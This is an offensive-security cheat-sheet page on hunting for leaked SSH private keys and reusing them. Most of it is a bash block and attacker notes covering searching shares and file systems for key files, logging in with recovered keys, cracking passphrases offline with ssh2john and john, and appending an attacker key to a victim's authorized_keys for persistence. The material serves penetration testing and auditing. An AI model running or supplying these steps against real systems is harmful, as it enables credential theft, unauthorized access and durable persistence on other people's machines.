---
title: "Public key exposure: finding and reusing SSH private keys"
description: "SSH public-key authentication is only as safe as the private key, and private keys leak constantly: committed to repositories, left in readable shares and backups, baked into images, and stored without a passphrase. A recovered private key authenticates as its owner with no password, and key reuse across hosts means one leaked key often opens many systems."
keywords:
  - ssh private key
  - authorized_keys
  - key reuse
  - passphrase
  - id_rsa
---

# Public key exposure

Public-key authentication is how most real SSH access is granted, and its security rests entirely on the secrecy of the private key, which is routinely lost. Private keys get committed to Git repositories, left world-readable in file shares and backups, baked into container images and VM templates, and stored without a passphrase for automation. A recovered private key authenticates as its owner immediately, no password involved, and because operators reuse the same key across many hosts, a single find frequently unlocks a fleet. The converse, writing an attacker public key into a target's `authorized_keys`, is durable access and persistence.

```bash
# hunt for private keys wherever files are readable
grep -rlE 'BEGIN (OPENSSH|RSA|EC|DSA) PRIVATE KEY' /mnt/share /loot 2>/dev/null
find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' -o -name '*.ppk' 2>/dev/null
# use a recovered key
chmod 600 id_rsa; ssh -i id_rsa user@<target>
# passphrase-protected? crack offline
ssh2john id_rsa > h && john --wordlist=rockyou.txt h
# convert PuTTY .ppk to OpenSSH if needed
puttygen key.ppk -O private-openssh -o id_rsa
# plant a key for access/persistence where you can write authorized_keys
echo 'ssh-ed25519 AAAA... a' >> ~victim/.ssh/authorized_keys
```

## Exploitation notes

- Search broadly: repositories and their history (`.git`), file shares, backups, image layers, CI secrets, and home directories; a passphraseless key is instant access, a passphrased one is crackable offline with `ssh2john`.
- Key reuse is the multiplier: map where the public half appears (`authorized_keys` across hosts, deploy keys) to find every system a recovered key opens.
- The matching username matters: a key authenticates as whichever account lists it in `authorized_keys`; try the obvious owner and common accounts (`root`, service names).
- Writing `authorized_keys` doubles as persistence; combine with any file-write primitive on the target's home (an NFS UID-spoof write, a writable share, an existing foothold).

## Tools

- [john the ripper (ssh2john)](https://github.com/openwall/john)
- [trufflehog (key discovery in repos/images)](https://github.com/trufflesecurity/trufflehog)

## References

- [OpenSSH authorized_keys](https://man.openbsd.org/sshd.8#AUTHORIZED_KEYS_FILE_FORMAT)
- [HackTricks: SSH keys](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh)
